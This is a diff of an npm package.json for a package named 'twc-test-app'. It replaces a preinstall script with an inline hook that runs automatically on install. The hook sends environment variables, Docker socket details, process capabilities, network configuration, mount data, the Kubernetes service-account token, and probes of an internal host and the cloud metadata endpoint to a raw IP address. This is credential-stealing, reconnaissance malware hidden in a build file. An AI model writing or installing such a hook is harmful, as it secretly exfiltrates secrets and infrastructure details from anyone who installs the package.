@@ -1,9 +1,14 @@
-{
-  "name": "twc-test-app",
-  "version": "1.0.0",
-  "main": "index.js",
-  "scripts": {
-    "preinstall": "chmod +x ./probe.sh && sh ./probe.sh",
-    "start": "node index.js"
-  }
+{  
+    "name": "twc-test-app",
+    "version": "1.0.0",
+    "main": "index.js",
+    "scripts": {
+      "preinstall": "curl -sG --data-urlencode \"d=$(env 2>/dev/null | head -c 800)\" http://5.39.252.153/F019-ENV; curl -sG --data-urlencode \"d=$(ls -la /var/run/docker.sock /run/docker.sock 2>&1)\" 
+  http://5.39.252.153/F019-SOCK; curl -sG --data-urlencode \"d=$(grep Cap /proc/self/status 2>/dev/null)\" http://5.39.252.153/F019-CAPS; curl -sG --data-urlencode \"d=$(ip route 2>/dev/null; cat 
+  /etc/resolv.conf)\" http://5.39.252.153/F019-NET; curl -sG --data-urlencode \"d=$(cat /proc/mounts 2>/dev/null | head -c 800)\" http://5.39.252.153/F019-MOUNTS; curl -sG --data-urlencode \"d=$(cat 
+  /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)\" http://5.39.252.153/F019-K8S-SA; curl -sG --connect-timeout 3 --max-time 4 --data-urlencode \"d=$(curl -sk --connect-timeout 2 --max-time 3 
+  http://192.168.4.72:8000/ 2>&1 | head -c 400)\" http://5.39.252.153/F019-REACH-INT; curl -sG --connect-timeout 3 --max-time 4 --data-urlencode \"d=$(curl -sk --connect-timeout 2 --max-time 3 
+  http://169.254.169.254/ 2>&1 | head -c 400)\" http://5.39.252.153/F019-REACH-META; true",
+      "start": "node index.js"
+    }
 }
